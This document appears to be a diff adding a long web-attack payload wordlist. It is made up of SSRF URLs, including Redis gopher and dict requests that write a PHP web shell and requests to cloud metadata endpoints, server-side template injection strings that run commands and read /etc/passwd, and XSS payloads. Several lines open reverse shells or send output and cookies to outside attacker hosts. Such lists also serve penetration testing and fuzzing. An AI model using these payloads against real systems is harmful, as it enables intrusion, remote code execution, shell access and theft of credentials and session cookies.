+dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+dict://127.0.0.1:6379/SAVE
+dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+dict://localhost:11211/stat
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+gopher://127.0.0.1:53/_%2500%251d%25a9%25c1...
+gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
+gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
+gopher://127.0.0.1:6379/_save
+gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec...
+gopher://127.0.0.1:9000/_%01%01%00%01%00...
+gopher://[host]:[port]/[type][selector]
+gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
+http://[::]
+http://0/
+http://0.0.0.0/
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]:22/
+http://0000::1:22
+http://0000::1:25
+http://0000::1:3128
+http://[0000::1]:80/
+http://0000::1:80
+http://0000::1:80/
+http://0.0.0.0:22
+http://0.0.0.0:22/
+http://0.0.0.0:443/
+http://0.0.0.0:80
+http://000330.0000072.0000326.00000343
+http://017700000001
+http://017700000001/
+http://017700000001:22/
+http://0177.00.00.01
+http://0177.0.0.1/
+http://0177.0.0.1:22/
+http://0:22/
+http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/
+http://0330.072.0326.0343
+http://033016553343
+http://0o177.0.0.1/
+http://0x7f000001/
+http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
+http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
+http://0xd8.0x3a.0xd6.0xe3
+http://0xd8.0x3a.0xd6e3
+http://0xd8.0x3ad6e3
+http://0xd83ad6e3
+http://127.0.0.0
+http://127.0.0.0/
+http://127.0.0.0:22/
+http://127.0.0.1/
+http://127.0.0.1:22
+http://127.0.0.1:22/
+http://127.0.0.1/%2561dmin
+http://127.0.0.1:443
+http://127.0.0.1:443/
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%69ndex.html
+http://127.0.0.1/%69ndex.php
+http://127.0.0.1:80
+http://127.0.1
+http://127.0.1/
+http://127.0.1.3
+http://127.0.1.3/
+http://127.0.1.3:22/
+http://127.1
+http://127.1/
+http://①②⑦.①/
+http://127.1.1.1:80#\@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1:22/
+http://①②⑦.①:22/
+http://127.1/%2561dmin
+http://127.127.127.127
+http://127.127.127.127/
+http://127.127.127.127:22/
+http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/metadata/v1
+http://169.254.169.254/metadata/v1/hostname
+http://2130706433
+http://2130706433/
+http://2130706433:22/
+http://216.0x3a.00000000326.0xe3
+http://[::]:22
+http://[::]:25
+http://2852039166/
+http://②⑧⑤②⓪③⑨①⑥⑥:80/
+http://[::]:3128
+http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
+http://3232235521/
+http://3232235777/
+http://3627734755
+http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/ 
+http://[::]:80
+http://[::]:80/
+http://brutelogic.com.br/poc.svg
+http://customer2-app-127-0-0-1.nip.io/
+http://customer3-app-7f000101.nip.io/
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
+http://example.com@127.0.0.1/
+http://[::ffff:127.0.0.1]
+http://localhost/
+http://localhost:22
+http://localhost:22/
+http://localhost:443/
+http://localhost:80
+http://localhost/server-status
+http://o177.0.0.1/
+http://q177.0.0.1/
+https://0/
+https://0.0.0.0/
+https://[0:0:0:0:0:ffff:127.0.0.1]/
+https://0.0.0.0:443
+https://017700000001/
+https://0177.0.0.1/
+https://127.0.0.0/
+https://127.0.0.1
+https://127.0.0.1/
+https://127.0.0.1:443
+https://127.0.0.1/%69ndex.html
+https://127.0.0.1/%69ndex.php
+https://127.0.1/
+https://127.0.1.3/
+https://127.1/
+https://①②⑦.①/
+https://127.127.127.127/
+https://2130706433/
+https://307.r3dir.me/--to/?url=http://localhost
+https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
+http://scanme.nmap.org:22
+https://example.com@127.0.0.1/
+https://localhost
+https://localhost/
+https://localhost:443
+http://whitelisted@127.0.0.1
+jar:ftp://127.0.0.1!/
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:scheme://domain/path!/
+ldap://localhost:11211/%0astats%0aquit
+localhost:00011211aaaa
+localhost:+11211aaa
+netdoc:///etc/passwd
+sftp://evil.com:11111/
+ssrf.php?url=dict://attacker:11111/
+tftp://evil.com:12346/TESTUDPPACKET
+http://127.0.0.1/
+http://127.0.0.1:22/
+http://127.0.0.1:443/
+http://0.0.0.0/
+http://0.0.0.0:22/
+http://0.0.0.0:443/
+http://localhost/
+http://localhost:22/
+http://localhost:443/
+https://127.0.0.1/
+https://localhost/
+https://0.0.0.0/
+http://0/
+http://[::]
+https://127.0.0.1
+https://localhost
+http://[::]:80
+http://[::]:25
+http://[::]:22
+http://[::]:3128
+http://0000::1:80
+http://0000::1:25
+http://0000::1:22
+http://0000::1:3128
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://2130706433
+http://[0:0:0:0:0:ffff:127.0.0.1]
+localhost:+11211aaa
+localhost:00011211aaaa
+http://0/
+http://127.1
+http://127.0.1
+http://customer2-app-127-0-0-1.nip.io/
+http://customer3-app-7f000101.nip.io/
+file:///etc/passwd
+file://\/\/etc/passwd
+http://brutelogic.com.br/poc.svg
+127。0。0。1
+http://127.0.0.1/%2561dmin
+http://127.1/%2561dmin
+http://0:22/
+https://0/
+http://127.1/
+http://127.1:22/
+http://127.0.1/
+https://127.1/
+https://127.0.1/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]:22/
+https://[0:0:0:0:0:ffff:127.0.0.1]/
+http://2130706433/
+http://2130706433:22/
+https://2130706433/
+http://127.127.127.127/
+https://127.127.127.127/
+http://127.127.127.127:22/
+http://127.0.1.3/
+https://127.0.1.3/
+http://127.0.1.3:22/
+http://127.0.0.0/
+http://127.0.0.0:22/
+https://127.0.0.0/
+http://0177.0.0.1/
+http://0177.0.0.1:22/
+https://0177.0.0.1/
+http://①②⑦.①/
+http://①②⑦.①:22/
+https://①②⑦.①/
+http://017700000001/
+http://017700000001:22/
+https://017700000001/
+http://example.com@127.0.0.1/
+https://example.com@127.0.0.1/
+http://127.0.0.1/%69ndex.php
+http://127.0.0.1/%69ndex.html
+https://127.0.0.1/%69ndex.php
+https://127.0.0.1/%69ndex.html
+file:///etc/passwd
+file:///etc/group
+file:///var/www/html/.htaccess
+file:///etc/hosts
+file:///etc/resolv.conf
+file:///etc/sysconfig/network
+file:///etc/network/interfaces
+file:///proc/version
+file:///etc/os-release
+${{<%[%'"}}%\
+${{3*3}}
+${6*6}
+${{7*7}}
+${7*7}
+${7*7} = 49
+${7*'7'} Nothing
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+${dwf.newInstance(ec,null)("id")}
+$ex.waitFor()
+${foobar}
+${"freemarker.template.utility.Execute"?new()("id")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
+${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
+${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
+${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
+${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
+${self.context._with_template._mmarker.module.cache.util.os.system("id")}
+${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
+${self.context._with_template.module.cache.compat.inspect.os.system("id")}
+${self.context._with_template.module.cache.util.os.system("id")}
+${self.context._with_template.module.filters.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
+${self.context._with_template.module.runtime.util.os.system("id")}
+${self.__init__.__globals__['util'].os.system('id')}
+${self.module.cache.compat.inspect.linecache.os.system("id")}
+${self.module.cache.compat.inspect.os.system("id")}
+${self.module.cache.util.compat.inspect.linecache.os.system("id")}
+${self.module.cache.util.compat.inspect.os.system("id")}
+${self.module.cache.util.os.system("id")}
+${self.module.filters.compat.inspect.linecache.os.system("id")}
+${self.module.filters.compat.inspect.os.system("id")}
+${self.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
+${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.util.os.system("id")}
+${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.util.compat.inspect.os.system("id")}
+${self.module.runtime.util.os.system("id")}
+${self.template.__init__.__globals__['os'].system('id')}
+${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
+${self.template._mmarker.module.cache.util.os.system("id")}
+${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
+${self.template._mmarker.module.runtime.util.os.system("id")}
+${self.template.module.cache.compat.inspect.linecache.os.system("id")}
+${self.template.module.cache.compat.inspect.os.system("id")}
+${self.template.module.cache.util.compat.inspect.os.system("id")}
+${self.template.module.cache.util.os.system("id")}
+${self.template.module.filters.compat.inspect.linecache.os.system("id")}
+${self.template.module.filters.compat.inspect.os.system("id")}
+${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.compat.inspect.os.system("id")}
+${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
+${self.template.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.runtime.util.compat.inspect.os.system("id")}
+${self.template.module.runtime.util.os.system("id")}
+{$smarty.version}
+$str.valueOf($chr.toChars($out.read()))
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(java.lang.System).getenv()}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+${= _.VERSION}
+{{[0]|reduce('system','id')}}
+@(1+2)
+{{2*2}}[[3*3]]
+#{ 3 * 3 }
+#{3*3}
+<%= 3 * 3 %>
+{{3*'3'}}
+{{3*3}}
+{{4*4}}[[5*5]]
+{{5096754695}}{{''}}{%+set+d+=+"eval(__import__('base64').urlsafe_b64decode('X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnZFc1aGJXVWdMV0U9JykuZGVjb2RlKCkpLnJlYWQoKQ=='))"+%}{%+for+c+in+[].__class__.__base__.__subclasses__()+%}+{%+if+c.__name__+==+'catch_warnings'+%} {%+for+b+in+c.__init__.__globals__.values()+%}+{%+if+b.__class__+==+{}.__class__+%} {%+if+'eval'+in+b.keys()+%} {{+b['eval'](d)+}} {%+endif+%}+{%+endif+%}+{%+endfor+%} {%+endif+%}+{%+endfor+%}{{''}}{{9776394213}}
+@(6+5)
+{{ '7'*7 }}
+{{ 7*7 }}
+{{7*'7'}}
+{{7*7}}
+{7*7}
+#{7*7} = 49 -- (legacy)
+{{7*7}} = {{7*7}}
+{{7*'7'}} would result in 49
+{{7*'7'}} would result in 7777777
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
+{{app.request.query.filter(0,0,1024,{'options':'system'})}}
+"{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
+{{app.request.server.all|join(',')}}
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+{{'a'.toUpperCase()}} 
+{{'a'.toUpperCase()}} would result in 'A'
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+@{// C# code}
+{{ [].class.base.subclasses() }}
+{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
+{{ [].class.base.subclasses() }} # get all classes
+{{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen
+{{''.class.mro()[1].subclasses()}}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+# ''.__class__.__mro__[2].__subclasses__()[40] = File class
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
+{{config.items()}}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
+Convert the returned bytes to ASCII
+{% csrf_token %}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{% debug %}
+<%= Dir.entries('/') %>
+{{dump(app)}}
+{{dump(_context)}}
+{{/each}}
+{{#each conslist}}
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{e.user.get_username}} : {{e.user.password}}{% endfor %}
+FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
+<%= File.open('/etc/passwd').read %>
+<%= File.open('/example/arbitrary-
+{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
+#foreach($i in [1..$out.available()])
+{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"/etc/passwd\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+#{"freemarker.template.utility.Execute"?new()("id")}
+[="freemarker.template.utility.Execute"?new()("id")]
+{% get_admin_log 10 as admin_log for_user user %}
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+<h1>User Profile</h1>
+# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
+{{['id',1]|sort('system')|join}}
+{{['id']|filter('passthru')}}
+{{['id']|filter('system')}}
+{{['id']|map('passthru')}}
+{{['id']|map('system')|join}}
+ih0vr{{364|add:733}}d121r
+{% import foobar %} = Error
+{%import os%}{{os.system('nslookup oastify.com')}}
+{% import os %}{{os.system('whoami')}}
+{% include 'admin/base.html' %}
+{{include("wp-config.php")}}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__["os"].popen('id').read() }}
+{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
+{{ messages.storages.0.signer.key }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+{{['nslookup oastify.com']|filter('system')}}
+{{os.system('whoami')}}
+<% perl code %>
+<%= perl code %>
+<p>Hello, <?=$this->e($name)?></p>
+<?php $this->layout('template', ['title' => 'User Profile']) ?>
+{php}echo `id`;{/php}
+{php system('nslookup oastify.com')}
+<pre>{% debug %}</pre>
+{{ request }}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{request|attr("__class__")}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request.__class__}}
+request.__class__
+request["__class__"]
+{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
+#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+{{ '<script>alert(3)</script>' }}
+{{ '<script>alert(3)</script>' | safe }}
+{{self}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{ self.__init__.__globals__.__builtins__ }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+#set($out=$ex.getInputStream())
+#set($str=$class.inspect("java.lang.String").type)
+{{settings.SECRET_KEY}}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('cat index.php')}
+{system('ls')}
+<%= system("whoami") %>
+{{= _.templateSettings.evaluate }}
+{{this}}
+{{this.pop}}
+{{this.push (lookup string.sub "constructor")}}
+{{this.push "return require('child_process').exec('whoami');"}}
+{T(java.lang.System).getenv()}
+{var $X="POC"}{$X}
+- var x = root.process
+<%= _.VERSION %>
+{{= _.VERSION}}
+{{/with}}
+{{#with "e"}}
+{{#with split as |conslist|}}
+{{#with string.split as |codelist|}}
+{{#with (string.sub.apply 0 codelist)}}
+wrtz{{#with "s" as |string|}}
+= x.exec('id | nc attacker.net 80')
+{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
+- x = x('child_process')
+- x = x.mainModule.require
+00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+%09Jav%09ascript:alert(1)
+0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
+0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
+%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3
+0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
+-->""/>0xr3dhunt</script><img/src=@&#32;&#13; onerror = prompt(&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;)>
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+¼script¾alert(¢XSS¢)¼/script¾
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
+1'"><img/src/onerror=.1|alert``>
+1script3document.vulnerable=true;1/script3
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
+'%22()%26%25<><ScRiPt%20>alert(1)</ScRiPt>
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
+%22%3e%3cscript%3ealert('XSS')%3c/script%3e
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
+%22;alert%28%27RVRSH3LL_XSS%29//
+%25253c%25252fscript%25253e%25253cscript%25253ealert%252528document.cookie%252529%25253c%25252fscript%25253e
+%253c%252fscript%253e%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253e
+%253cscript%253ealert(1)%253c/script%253e
+%253cscript%253ealert(document.cookie)%253c/script%253e
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+'"()%26%25<><ScRiPt >alert(document.domain)</ScRiPt>
+%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
++330011223344;phone-context=<script>alert(0)</script>
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+\&#34;+confirm(1)+&#34;
+&#39;&#88;&#83;&#83;&#39;&#41;>
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+"%3cscript%3ealert(""WXSS"");%3c/script%3e"
+%3cscript%3ealert('XSS')%3c/script%3e
+&#60
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
++ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+a=\"get\";
+a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);
+a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+<a href="about:<script>document.vulnerable=true;</script>">
+"<a href=""about:<script>document.write(""XSS-XSS-XSS"");</script>"">"
+"<A HREF=""//blog.zsec.uk/"">XSS</A>"
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+"<A HREF=""//google"">XSS</A>"
+<;A HREF=";//google";>;XSS<;/A>;
+"<A HREF=""h\ntt\tp://6"
+"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>"
+<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>"
+<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+"<A HREF=""http://1113982867/"">XSS</A>"
+<;A HREF=";http://1113982867/";>;XSS<;/A>;
+<A HREF="http://1113982867/">XSS</A>
+<A HREF="htt    p://6   6.000146.0x7.147/">XSS</A>
+<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
+<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
+<A HREF="http://66.102.7.147/">XSS</A>
+"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>"
+<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+"<A HREF=""http://blog.zsec.uk./"">XSS</A>"
+"<A HREF=""http://blog.zsec.uk/"">XSS</A>"
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<;A HREF=";http://google.com/";>;XSS<;/A>;
+<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
+<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
+"<A HREF=""http://www.gohttp://blog.zsec.uk/ogle.com/"">XSS</A>"
